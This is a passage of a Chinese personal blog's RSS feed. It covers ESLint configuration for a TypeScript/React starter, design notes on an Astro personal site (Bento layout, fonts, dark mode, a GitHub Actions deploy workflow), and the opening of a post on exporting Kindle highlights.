&lt;p&gt;运行完成后，除了安装了一堆插件，项目根目录会产生配置文件 &lt;code&gt;.eslintrc.js&lt;/code&gt;（或者其他文件格式，取决于你的选择）。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// .eslintrc.js
module.exports = {
  env: {
    browser: true,
    es2021: true,
  },
  extends: [&amp;quot;standard-with-typescript&amp;quot;, &amp;quot;plugin:react/recommended&amp;quot;],
  overrides: [
    {
      env: {
        node: true,
      },
      files: [&amp;quot;.eslintrc.{js,cjs}&amp;quot;],
      parserOptions: {
        sourceType: &amp;quot;script&amp;quot;,
      },
    },
  ],
  parserOptions: {
    ecmaVersion: &amp;quot;latest&amp;quot;,
    sourceType: &amp;quot;module&amp;quot;,
  },
  plugins: [&amp;quot;react&amp;quot;],
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;现在，再次 build，ESLint 会按照我们设定的规则进行代码检查。&lt;/p&gt;
&lt;p&gt;可以在配置文件中添加一些自己习惯的规则，比如使用双引号、行末加分号。并且，需要设置对于 &lt;code&gt;*.config.js&lt;/code&gt; 这类配置文件的特殊检测规则。我的 &lt;code&gt;.eslintrc.js&lt;/code&gt; 文件设置如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// .eslintrc.js
module.exports = {
  env: {
    browser: true,
    es2021: true
  },
  extends: [&amp;quot;standard-with-typescript&amp;quot;, &amp;quot;plugin:react/recommended&amp;quot;],
  overrides: [
    {
      env: {
        node: true
      },
      files: [&amp;quot;.eslintrc.js&amp;quot;, &amp;quot;*.config.js&amp;quot;],
      parserOptions: {
        sourceType: &amp;quot;script&amp;quot;
      },
      extends: [&amp;quot;plugin:@typescript-eslint/disable-type-checked&amp;quot;],
      rules: {
        &amp;quot;@typescript-eslint/no-var-requires&amp;quot;: &amp;quot;off&amp;quot;
      }
    }
  ],
  parserOptions: {
    ecmaVersion: &amp;quot;latest&amp;quot;,
    sourceType: &amp;quot;module&amp;quot;
  },
  rules: {
    &amp;quot;@typescript-eslint/semi&amp;quot;: [&amp;quot;error&amp;quot;, &amp;quot;always&amp;quot;],
    &amp;quot;@typescript-eslint/quotes&amp;quot;: [&amp;quot;error&amp;quot;, &amp;quot;double&amp;quot;]
  },
  plugins: [&amp;quot;react&amp;quot;]
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;⚠️ &lt;strong&gt;一个坑点：&lt;/strong&gt;使用 TypeScript 时，由于使用 typescript-eslint 的解析器而非默认解析器（&lt;a href=&quot;https://github.com/mightyiam/eslint-config-standard-with-typescript&quot;&gt;文档&lt;/a&gt;），添加规则要写 &lt;code&gt;@typescript-eslint/quotes&lt;/code&gt; 而非 &lt;code&gt;quotes&lt;/code&gt;，否则不会生效。例如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// eslintrc.js
module.exports = {
  // ...
  rules: {
    &amp;quot;@typescript-eslint/quotes&amp;quot;: [&amp;quot;error&amp;quot;, &amp;quot;double&amp;quot;],
    &amp;quot;@typescript-eslint/semi&amp;quot;: [&amp;quot;error&amp;quot;, &amp;quot;always&amp;quot;],
  },
  // ...
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;💡 或许你同时在 IDE 中使用 &lt;strong&gt;Prettier&lt;/strong&gt; 一类的&lt;strong&gt;代码格式化工具&lt;/strong&gt;。其文档中 &lt;a href=&quot;https://prettier.io/docs/en/comparison&quot;&gt;Prettier vs. Linters&lt;/a&gt; 介绍了这两种工具的区别；&lt;a href=&quot;https://prettier.io/docs/en/integrating-with-linters.html&quot;&gt;Integrating with Linters&lt;/a&gt; 介绍了其与 linter 的集成指南。简而言之，在 ESLint 配置中应用 &lt;a href=&quot;https://github.com/prettier/eslint-config-prettier&quot;&gt;eslint-config-prettier&lt;/a&gt; 规则集即可自动关闭所有与 Prettier 冲突的规则。不过我更推荐的是在 IDE 中安装 ESLint 插件，对于 js 类文件直接使用 ESLint 作为代码格式化工具，这样能够确保遵循 eslintrc 中的规则。&lt;/p&gt;
&lt;p&gt;（ESLint 这部分配置起来还是挺麻烦的，尤其要集成到 VSCode，同时兼容 TypeScript，并考虑到其和 Prettier 的冲突。改天配置好了一个比较 fancy 的方案再单独写一篇）&lt;/p&gt;
&lt;h2&gt;Recap：站在巨人的肩膀上&lt;/h2&gt;
&lt;p&gt;至此，一套比较完整的&lt;strong&gt;前端项目 starter&lt;/strong&gt; 终于配置完毕了。完整的项目可以在&lt;a href=&quot;https://github.com/Skywt2003/starter.git&quot;&gt;这个仓库&lt;/a&gt;查看。&lt;/p&gt;
&lt;p&gt;回顾一下，我们首先使用了 &lt;strong&gt;webpack&lt;/strong&gt; 作为打包工具；其 &lt;strong&gt;PostCSS&lt;/strong&gt; 插件能够对 CSS 进行处理；&lt;strong&gt;Tailwind&lt;/strong&gt; 则可以作为 PostCSS 插件集成。我们使用 &lt;strong&gt;Babel&lt;/strong&gt; 这个 transpiler 处理各种脚本文件，其中 &lt;strong&gt;env&lt;/strong&gt; preset 将 ECMAScript 较先进的特性转译为旧特性的实现，确保兼容性；&lt;strong&gt;TypeScript&lt;/strong&gt; 和 &lt;strong&gt;React JSX&lt;/strong&gt; 两个 preset 则分别将它们各自的语法转译成 JavaScript。最后，我们使用 &lt;strong&gt;ESLint&lt;/strong&gt; 作为代码质量检查工具，并配置其针对 TypeScript 和 JSX 的规则。&lt;/p&gt;
&lt;p&gt;使用的工具链关系示意图如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/03/543791890.png&quot; alt=&quot;配置完毕后的工具链示意图&quot;&gt;&lt;/p&gt;
&lt;p&gt;相比从前，各种工具让开发的过程变得越来越优雅和美妙。然而每个工具背后，都有无数前人的辛勤付出，没有他们的这些努力，我们无法得到这样现代化的前端开发体验。&lt;/p&gt;
&lt;p&gt;现代前端开发，就是&lt;strong&gt;站在巨人的肩膀上&lt;/strong&gt;。&lt;/p&gt;
&lt;h3&gt;一点思考 🤔&lt;/h3&gt;
&lt;p&gt;最后，还有一个我的疑问：&lt;strong&gt;相比其他领域，为什么 Web 前端开发的工具链会呈现如此复杂的形态呢？&lt;/strong&gt;我体验过 iOS 开发，也了解过基于 Qt 等框架的客户端开发，我个人的感觉是没有一个领域的客户端开发像 Web 前端这样有如此庞大复杂的工具链：某个工具可以配置插件，插件又有插件，插件的插件又有插件……那么归根结底，Web 前端工具链这种复杂的形式，是历史发展的必然，是某种设计缺陷的后果，还是某种设计思想的体现？🤔&lt;/p&gt;
&lt;p&gt;欢迎分享你的思考。&lt;/p&gt;
&lt;h2&gt;值得一读&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Web development used to be a great entry point for people new to programming precisely because it was so easy to get up and running; nowadays it can be quite daunting, especially because the various tools tend to change rapidly.&lt;/p&gt;
&lt;p&gt;—— Modern JavaScript Explained For Dinosaurs&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;值得一读的相关文章；&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://peterxjang.com/blog/modern-javascript-explained-for-dinosaurs.html&quot;&gt;Modern JavaScript Explained For Dinosaurs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Learn/Tools_and_testing/Understanding_client-side_tools/Introducing_complete_toolchain&quot;&gt;介绍完整的工具链 - 学习 Web 开发 | MDN&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://pomb.us/build-your-own-react/&quot;&gt;Build your own React&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>全新个人网站 Daydreamer 设计开发手记</title><link>https://skywt.cn/blog/new-personal-website-daydreamer-design-development-log/</link><guid isPermaLink="true">https://skywt.cn/blog/new-personal-website-daydreamer-design-development-log/</guid><description>想写一个新的个人主页很久了，甚至基于 Next.js、Nuxt.js 分别做过雏形，但是都半途而废。寒假接触到了早有耳闻的 Astro.js，这个框架简洁优雅的设计吸引了我。于是一发不可收拾，开发了全新版本的主页，并将各种页面和博客系统也集成进了这个主页。在设计和开发的过程中有无数的纠结和思考，特此记录下来。

</description><pubDate>Sun, 03 Mar 2024 09:15:51 GMT</pubDate><content:encoded>&lt;p&gt;想写一个新的个人主页很久了，甚至基于 Next.js、Nuxt.js 分别做过雏形，但是都半途而废。寒假接触到了早有耳闻的 Astro.js，这个框架简洁优雅的设计吸引了我。于是一发不可收拾，开发了全新版本的主页，并将各种页面和博客系统也集成进了这个主页。在设计和开发的过程中有无数的纠结和思考，特此记录下来。&lt;/p&gt;
&lt;!--more--&gt;
&lt;h2&gt;Bento 式布局&lt;/h2&gt;
&lt;p&gt;我是看了少数派的《&lt;a href=&quot;https://sspai.com/post/84628&quot;&gt;何为 Bento 式布局，怎么生产力工具网站都在用？&lt;/a&gt;》这篇文章，想到用 Bento 的风格做一个个人网站的。Bento 式布局各种信息平级，非常适合「自我介绍」。相比一大段文字的自我介绍，用这种布局更有意思，也更吸引人阅读。&lt;/p&gt;
&lt;p&gt;很早之前试用了 &lt;a href=&quot;https://bento.me&quot;&gt;Bento.me&lt;/a&gt; 这个广受好评的工具，虽然功能比较有限，但是其 UI / UX 设计精雕细琢，非常精致。这次可以说我的网站 Bento 部分其实很大程度仿制了 Bento.me 的风格。&lt;/p&gt;
&lt;p&gt;由于 Bento 布局不是线性的，所以没法像平常的网页一样采用响应式的逻辑，当页面宽度减小时自动调整。Bento.me 对于这个问题的解决办法是：提供大屏幕（四列）、小屏幕（两列）两套布局，让用户分别配置调整。参考这一方法，我的 Bento 组件也针对四列、两列分别指定了布局。&lt;/p&gt;
&lt;p&gt;在使用 Astro 编写这一部分组件的时候，最麻烦的其实是确定一个 Box 的抽象层级。每个 Box 看似都可以写成一个组件、可复用，但是许多 Box 又有不同的背景、背景位置、前景色、hover 行为、对齐方式…… 这些都只能在 Box 的最外围元素上指定，如果通过 props 传递，则过于冗长，代码会十分丑陋。综合考虑，我定义每个 Box 最外层用一个 BoxWrapper 组件，专门负责 positioning，分别指定四列、两列模式的大小、位置；在 BoxWrapper 的 slot 中放置内部的组件，干脆分为多种组件：纯文字的 Box、带背景的 BgBox、地图组件 Map（其实这是个图片）以及 MBTI 组件等等。虽然各个组件之中还有不少重复代码，不符合 DRY 原则，但是暂时想不到更加合理的解耦合方式。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/03/2186256819.png&quot; alt=&quot;最终的 Bento 效果&quot;&gt;&lt;/p&gt;
&lt;h2&gt;字体的选择&lt;/h2&gt;
&lt;p&gt;对于一个有设计的网站，字体的选择其实非常重要。它是网站 personality 的重要部分（参考《Refactoring UI》）。&lt;/p&gt;
&lt;p&gt;我一直钟情于 serif 字体，因为它们看起来文艺且有些复古，非常适合个人博客。所以，这次我还是全局使用了&lt;strong&gt;思源宋体&lt;/strong&gt;。为了在不同平台呈现相同的字体体验，我使用 Google Fonts 并使用 loli.net 的镜像。&lt;/p&gt;
&lt;p&gt;此外，对于引言（blockquote）中的字体，我其实希望使用&lt;strong&gt;楷体&lt;/strong&gt;（因为感觉很多出版物都是这么做的）。然而由于中英文字体体系分类的不同（serif 对应宋体，sans 对应黑体，什么对应楷体呢？），楷体似乎没有被纳入 Web 字体世界的一等公民，在 Google Fonts 中也没有提供。我只能尽量尝试使用用户本地的楷体。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-css&quot;&gt;.font-kai {
  font-family: &amp;quot;KaiTi&amp;quot;, &amp;quot;KaiTiGB2312&amp;quot;, &amp;quot;STKaiti&amp;quot;, &amp;quot;Noto Serif SC&amp;quot;, serif;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;需要注意一个离谱的问题：&lt;strong&gt;macOS Safari 浏览器不支持本地楷体&lt;/strong&gt;。原因是「为了保护隐私，防止通过用户安装的字体追踪用户」，Safari 中 &lt;code&gt;font-family&lt;/code&gt; 不能使用本地安装的所有字体，只能使用系统字体的一个子集……而这个子集不包括楷体（&lt;a href=&quot;https://stackoverflow.com/questions/52692905/font-family-display-issue-in-safari-12-on-macos-mojave&quot;&gt;参考&lt;/a&gt;）。所以，macOS Safari 浏览器无法使用楷体。看来，又 get 了 Safari 的一个逆天特性 😇。&lt;/p&gt;
&lt;h2&gt;Darkmode 支持&lt;/h2&gt;
&lt;p&gt;让网站支持 darkmode 是我的一个执念。因为：1）所有浏览器、操作系统都有了 darkmode 的功能，如果不去兼容这个功能，会感觉自己的网站是「功能残缺」的；2）我既想要纯白的简洁设计，又想要在被窝里看着不伤眼睛的暗色设计。同时做两套主题能够满足我这样的要求。&lt;/p&gt;
&lt;p&gt;然而 darkmode 设计和实现起来并不容易。为了保证颜色的协调，往往需要对两套主题单独调整颜色，并不是简单的「反色」。&lt;/p&gt;
&lt;p&gt;比如，我们天然会认为「&lt;strong&gt;颜色较浅（较亮）的元素是突出的&lt;/strong&gt;」。如果要绘制一个按钮或卡片，不管白天黑夜，前景都必须比背景更浅（更亮）。所以在白天就要采用「浅灰色背景、白色前景」，夜晚就要使用「黑色背景、深灰色前景」，这样看起来才会统一且协调。比如，看下面四种配色方案下的按钮，显然 2 和 3 是比较正常的，而 1 和 4 则比较奇怪。（然而事实上，1 和 3、2 和 4 分别互为反色。）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/03/3175599989.png&quot; alt=&quot;四种配色方案中的按钮&quot;&gt;&lt;/p&gt;
&lt;p&gt;由此可见，&lt;strong&gt;darkmode 不能是单纯的反色&lt;/strong&gt;，而是对色彩方案的单独设计。这一点在 Apple Developer 的《&lt;a href=&quot;https://developer.apple.com/cn/design/human-interface-guidelines/&quot;&gt;人机界面指南&lt;/a&gt;》中《&lt;a href=&quot;https://developer.apple.com/cn/design/human-interface-guidelines/dark-mode&quot;&gt;深色模式&lt;/a&gt;》一篇也有提及：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;深色模式下的调色盘包含&lt;strong&gt;较暗的背景颜色和较亮的前景颜色&lt;/strong&gt;。需要注意的是，&lt;strong&gt;这些颜色不一定是其对应的浅色颜色的反转&lt;/strong&gt;：虽然很多颜色是被反转的，但有些颜色则不是。有关更多信息，请参阅&lt;a href=&quot;https://developer.apple.com/cn/design/human-interface-guidelines/color#Specifications&quot;&gt;规范&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;还有另一个问题，黑夜模式的背景使用 &lt;code&gt;0x000000&lt;/code&gt; 的纯黑并不是一个很好的选择。纯黑俗称「A 屏黑」，在夜晚看久了眼睛会非常不舒服。作为替代，我必须选用一种接近 black 的更浅的背景色。&lt;/p&gt;
&lt;h3&gt;从白到黑：gray 与 neutual&lt;/h3&gt;
&lt;p&gt;查看了 Tailwind 提供的颜色列表，才知道从 white 到 black，并不止 gray 一种过渡方式。Tailwind 提供了 gray、neutral、cool、warm 四种方式，每种都有 100 到 900 从白到黑的过渡值。&lt;/p&gt;
&lt;p&gt;我并不懂一些复杂的色彩理论，只是从视觉上凭感觉而言，我觉得 darkmode 更适合用 neutral 系列的颜色。它看起来更温暖和舒服，也给人一种文艺的感觉，非常适合个人网站。相比之下，gray 整体偏蓝。我的 Daydream Typecho 主题的 darkmode 背景色就是 pico.css 提供的 gray 系列颜色，相比之下可以明显感到 gray 作为背景色更蓝一点。&lt;/p&gt;
&lt;p&gt;而白天 lightmode 应该用哪种灰色呢？还是凭感觉，我认为白天用 neutral 系列则会感觉偏暖。因为在白天我希望传达出的是一种「富有执行力、富有活力」的感觉，所以似乎用 gray 更加合适。（当然这都是我极其主观的感受……）&lt;/p&gt;
&lt;p&gt;所以最终决定：白天用 gray 系列颜色，夜晚用 neutral 系列颜色。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;白天：背景为 &lt;code&gt;gray-100&lt;/code&gt;，前景为 &lt;code&gt;white&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;夜晚：背景为 &lt;code&gt;neutral-900&lt;/code&gt;，前景为 &lt;code&gt;neutral-800&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;白天和晚上的 shadow&lt;/h3&gt;
&lt;p&gt;下一个棘手的问题是&lt;strong&gt;阴影&lt;/strong&gt;。阴影能够给页面元素添加立体感，Tailwind 也提供了方便的 class 应用阴影，所以我非常喜欢用。然而，darkmode 下如何应用阴影，值得仔细思考。&lt;/p&gt;
&lt;p&gt;从现实生活的经验来说，阴影产生于对光线的遮挡。所以，白天光线充足的时候，会产生黑色的阴影。然而，夜晚没有光线的时候，就&lt;strong&gt;不会产生阴影&lt;/strong&gt;。夜晚并不会产生白色的阴影，这再次说明了「darkmode 颜色方案不能是对 lightmode 的反转」。&lt;/p&gt;
&lt;p&gt;然而，「夜晚不会产生阴影」的前提「夜晚没有光线」，这一点很奇怪，因为如果没有光线，我们就看不见任何东西，怎么能看见页面中的各种元素呢？&lt;/p&gt;
&lt;p&gt;这提示我重新思考 lightmode、darkmode 和整个网页对应我们现实生活经验中的具体场景。想象一个开着灯的房间，地面上摆满了网页里的各种元素。当开着灯的时候（lightmode），所有按钮、卡片都呈现白色，并自然地投射出黑色的阴影；当关了灯后（darkmode），所有按钮、卡片&lt;strong&gt;本身会发出微弱的光&lt;/strong&gt;（否则无法解释为什么还能看到它们）。&lt;/p&gt;
&lt;p&gt;因此，我调整了夜间模式阴影的颜色。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/03/1210753927.png&quot; alt=&quot;白天和夜晚的按钮&quot;&gt;&lt;/p&gt;
&lt;p&gt;这不是最好的设计，但应该至少是逻辑可以自洽的设计……&lt;/p&gt;
&lt;h3&gt;主题切换按钮？&lt;/h3&gt;
&lt;p&gt;还有一个比较犹豫的点，就是是否要在网站中加上&lt;strong&gt;主题切换按钮&lt;/strong&gt;，即在「跟随系统、亮色主题、暗色主题」之间切换。这是不少网站流行的做法。&lt;/p&gt;
&lt;p&gt;其实我已经初步实现了这样的组件，但是在测试中有如下几个问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;浏览器的主题设置，源于 &lt;code&gt;prefers-color-scheme: dark&lt;/code&gt; 媒体查询，这是不能被修改的；如果要在系统查询结果为 light 时显示 dark 主题，就需要在 &lt;code&gt;tailwind.config.js&lt;/code&gt; 中添加配置 &lt;code&gt;darkMode: &amp;quot;class&amp;quot;&lt;/code&gt;，指示「不听从浏览器设置，只在设置了名为 dark 的 class 时显示为 darkmode」。但是如果添加此设置，用户的亮暗色主题必须完全自行维护，即使用户设定「跟随系统」。这样，在某些情况下逻辑会非常复杂（比如用户选择「跟随系统」，然后在浏览网页时在设置页面切换了 darkmode，需要手动监听这样的事件并维护状态……）。&lt;/li&gt;
&lt;li&gt;很多用户（特别是 Windows 用户）会无法理解「主题切换」的含义，这一按钮对于他们会带来困扰。如果他们误将主题设置为「亮色主题」或「暗色主题」，将永远无法看到另一种主题。非常可惜。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;仔细想想，其实在网页中提供主题切换按钮并没有必要。对于知晓 darkmode 概念的用户，他们自然会在浏览器中设置好自己适应的主题；对于不知晓 darkmode 概念的用户，他们不在乎这一功能，设置这一按钮也会带来困扰。&lt;/p&gt;
&lt;p&gt;Apple Developer 在《人机交互指南》中《深色模式》的最佳实践里也写道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;避免提供 App 特定的外观设置。&lt;/strong&gt;App 特定的外观模式选项会额外增加用户的工作量，因为他们必须调整多项设置才能得到想要的外观。更糟糕的是，用户可能会觉得你的 App 是有问题的，因为 App 没有使用他们选择的系统范围外观。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;综上所述，我没有添加主题切换按钮。&lt;/p&gt;
&lt;h2&gt;GitHub Actions 自动构建和发布&lt;/h2&gt;
&lt;p&gt;最后，我希望我的网站使用 GitHub Actions 自动构建和发布。&lt;/p&gt;
&lt;p&gt;如果不使用 GitHub Actions，我能够想象到我滑稽的手动构建流程：在本地 &lt;code&gt;npm run build&lt;/code&gt;，然后将生成的 &lt;code&gt;/dist&lt;/code&gt; 目录打包 &lt;code&gt;scp&lt;/code&gt; 上传到服务器，在服务器上删除原来的网站文件，解压压缩包放进网站目录……这一套全手动流程太不优雅了，也缺乏标准化。&lt;/p&gt;
&lt;p&gt;如果将网站部署到 Vercel 之类的 Serverless 平台，对应的平台都提供了非常方便的一键设置。但是，我希望将构建完毕的网站部署在自己的服务器上。这就需要手动编写自己的 Action。具体来说，参照 GitHub Pages 的实现，运行 &lt;code&gt;npm run build&lt;/code&gt; 之后将 &lt;code&gt;/dist&lt;/code&gt; 目录生成的文件部署到 &lt;code&gt;pages&lt;/code&gt; 分支。在我服务器上的网站目录中，使用 git 克隆 &lt;code&gt;pages&lt;/code&gt; 分支的文件，每次网站更新之后只需要 &lt;code&gt;pull&lt;/code&gt; 即可。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;name: Deploy Stable Version

on:
  push:
    branches:
      - main
  workflow_dispatch:

permissions:
  contents: write

jobs:
  build-and-deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          ref: main
      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 21
      - name: Install dependencies
        run: npm install
      - name: Build project
        run: npm run build
      - name: Deploy to pages branch
        uses: peaceiris/actions-gh-pages@v3
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }}
          publish_dir: ./dist
          publish_branch: pages
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在构建的时候会遇到网络问题。因为我的博客系统（blog.skywt.cn）使用了又拍云的 CDN，对海外线路的支持非常差。对于海外用户来说，使用又拍云 CDN「加速」实际上是「减速」，并且经常出现无法访问的现象。GitHub Actions 的 runner 当然都在海外，在构建的过程中，需要访问我博客的 API 获取大量数据，这个过程中难免会出现网络问题，导致构建失败。&lt;/p&gt;
&lt;p&gt;解决方法灵感源于这篇《&lt;a href=&quot;https://bra.live/how-to-achieve-global-acceleration-for-overseas-business-for-free/&quot;&gt;出海业务如何免费做到全球加速&lt;/a&gt;》。我的 DNS 是阿里云提供的，阿里云 DNS 也提供了分线路解析的功能。可以将「境外」线路直接解析到服务器 IP，「默认」配置（即其他国内线路）解析到又拍云 CDN。这样，境外线路不会通过又拍云 CDN，虽然延迟不小，但不会再出现网络问题。（不过更好的解决方案是国内走又拍云 CDN，国外走 Cloudflare 或者 Cloudfront。改天配置好了这个可以单独写篇文章。）&lt;/p&gt;
&lt;h2&gt;最后：「黑客与画家」&lt;/h2&gt;
&lt;p&gt;某天在玩 Cities: Skylines（一款城市设计规划游戏）的时候突然想到：我在做的事情和搞开发好像。都是创造一个东西，看这个东西运行起来，并获得某种成就感。甚至前者的入门门槛和后者一样高……&lt;/p&gt;
&lt;p&gt;之前《电路与电子学》课程的期末设计，用 Quartus II 设计一个原型机，需要自己设计组件之间的各种连线。做这个大作业前几天我也沉迷 Cities: Skylines，当时在给各种组件之间连线的时候，我恍惚有一种神奇的感受：这好像在 Cities: Skylines 中修建道路。没错，这也和游戏很像。&lt;/p&gt;
&lt;p&gt;本质上，这些给我们带来的都是&lt;strong&gt;创造的快乐&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;其实 Cities: Skylines、Minecraft 这一类游戏，要求玩家在其中创造城市或建筑，和城市规划、建筑设计的工作非常类似，只是简化了流程、缩短了反馈时间、降低了门槛。许多人戏称玩 Cities: Skylines 是「上班」。而玩家这些&lt;strong&gt;本来应该是「生产」的行为，却成了「消费」的行为。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是因为人们在真正的工作中无法获得满足感，每天都做着自己也认为毫无意义的工作，所以只能在下班时间在这些游戏里寻找有意义的「创造」的快乐。&lt;/p&gt;
&lt;p&gt;所以马克思写道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;人只有在运用自己的动物机能——吃、喝、生殖，至多还有居住、修饰等——的时候，才觉得自己在自由活动，而在运用人的机能时，觉得自己只不过是动物。&lt;/p&gt;
&lt;p&gt;于是，动物的东西成了人的东西，而人的东西成为动物的东西。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;说回搞开发，我越来越感觉到，开发本质上和这些游戏不是一样的吗？一样是在创造一个东西，一样能够得到即时的反馈。只是 Skylines 里面创造的是城市，软件开发创造的是软件。&lt;strong&gt;软件开发者也是创作者。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;黑客与画家的共同之处，在于他们都是&lt;strong&gt;创作者&lt;/strong&gt;。与作曲家、建筑师、作家一样，黑客和画家都是试图创作出优秀的作品。&lt;/p&gt;
&lt;p&gt;——《黑客与画家》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果未来能在自己的事业中体会到「创造」的成就感，那将是十分幸运和幸福的事情。&lt;/p&gt;
&lt;h3&gt;Daydreamer&lt;/h3&gt;
&lt;p&gt;这整套程序，我将其命名为 Daydreamer，它将作为一个持续开发的 playground，加入各种好玩的功能。&lt;/p&gt;
&lt;p&gt;其实《Daydreamer》是 AURORA 的一首歌，这也是 Apple WWDC 2020 的开场曲。那是 Apple 第一次因疫情线上举办 WWDC。&lt;/p&gt;
&lt;iframe allow=&quot;autoplay *; encrypted-media *; fullscreen *; clipboard-write&quot; frameborder=&quot;0&quot; height=&quot;175&quot; style=&quot;width:100%;max-width:660px;overflow:hidden;border-radius:10px;&quot; sandbox=&quot;allow-forms allow-popups allow-same-origin allow-scripts allow-storage-access-by-user-activation allow-top-navigation-by-user-activation&quot; src=&quot;https://embed.music.apple.com/cn/album/daydreamer/1457181981?i=1457182009&quot;&gt;&lt;/iframe&gt;
&lt;blockquote&gt;
&lt;p&gt;Then we become night time dreamers&lt;br&gt;
Street walkers, small talkers&lt;br&gt;
When we should be daydreamers&lt;br&gt;
And moonwalkers, and dream talkers&lt;/p&gt;
&lt;p&gt;——《Daydreamer》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;是呀，我们慢慢在夜里才敢做梦，慢慢成为了没有梦想的平凡之辈。&lt;/p&gt;
&lt;p&gt;但是我们本可以在白天做着白日梦，我们可以登上月球，可以大声谈论自己的梦想。&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>找寻一个简易的 Kindle 书摘管理方案</title><link>https://skywt.cn/blog/find-an-easy-kindle-extraction-management-solution/</link><guid isPermaLink="true">https://skywt.cn/blog/find-an-easy-kindle-extraction-management-solution/</guid><description>上学期，我购入了 Kindle 并决定将它离线使用。Kindle 的阅读体验确实一流，但是由于亚马逊生态的封闭，从 Kindle 导出书摘、笔记就有些困难。

</description><pubDate>Sat, 12 Aug 2023 07:20:00 GMT</pubDate><content:encoded>&lt;p&gt;上学期，我购入了 Kindle 并决定将它离线使用。Kindle 的阅读体验确实一流，但是由于亚马逊生态的封闭，从 Kindle 导出书摘、笔记就有些困难。&lt;/p&gt;
&lt;!--more--&gt;
&lt;h2&gt;书摘导出的困难&lt;/h2&gt;
&lt;p&gt;在阅读时的划线批注，存储在哪里呢？&lt;/p&gt;
&lt;p&gt;将 Kindle 连接电脑后，观察挂载的硬盘目录，会发现书籍对应的 mobi 文件同目录下有一个同名的以 &lt;code&gt;.sdr&lt;/code&gt; 结尾的文件夹，文件夹中有拓展名为 &lt;code&gt;.mbs&lt;/code&gt; 和 &lt;code&gt;.mbp1&lt;/code&gt; 的文件，这便是 Kindle 保存我们的阅读信息的地方，包括阅读时的划线、阅读位置、书签等各种信息。对于 mobi 以外的其他格式，这个文件的拓展名也不一样。&lt;/p&gt;
&lt;p&gt;然而，这两个文件采用了 Kindle 专有的格式，用文本编辑器无法打开。论坛里有大佬编写了 &lt;a href=&quot;https://www.mobileread.com/forums/showthread.php?t=322172&quot;&gt;KRDS&lt;/a&gt; 软件——用于这两个文件的解析器，可以将这些文件的内容解析为 json 数据。然而，经过尝试，解析得到的书摘（划线）只记录了「在书中的开始位置」和「在书中的结束位置」，而这些位置的地址格式也是 Kindle 的专有格式，是不可读的。&lt;/p&gt;
&lt;p&gt;似乎，从 sdr 文件夹中读取和阅读时完全一致的数据，非常困难。&lt;/p&gt;
&lt;h2&gt;My Clippings.txt&lt;/h2&gt;
&lt;p&gt;在书中划线批注时，Kindle 还会将我们的划线批注，连同时间、书籍信息等内容，以特定的文本格式自动加入一个名为 My Clippings.txt 的文档中。这个文件在 Kindle 的根目录下 documents 文件夹里。在 Kindle 图书馆里，会显示为一本书，叫做「我的书摘」。&lt;/p&gt;
&lt;p&gt;这个文本文件和上述实际存储我们书摘的 sdr 文件夹是独立的。Kindle 做的只是在我们添加书摘时，将内容的副本加到 txt 文档的末端。这意味着，当我们因为误划线等原因删除书摘，它仍然会停留在 txt 文档中；其中的书摘按照时间顺序排列；当我们修改书的作者等元信息，txt 中书摘记录的内容并不会修改。也就是说，这个文本文件失去了和书籍的耦合。这不是我想要的书摘管理方式。&lt;/p&gt;
&lt;p&gt;既然这个 txt 是可读的，我们可以定期将它导入电脑管理。许多号称能导入、同步、管理 Kindle 书摘的软件，都是这么做的。&lt;/p&gt;
&lt;h2&gt;其他软件的解决方案&lt;/h2&gt;
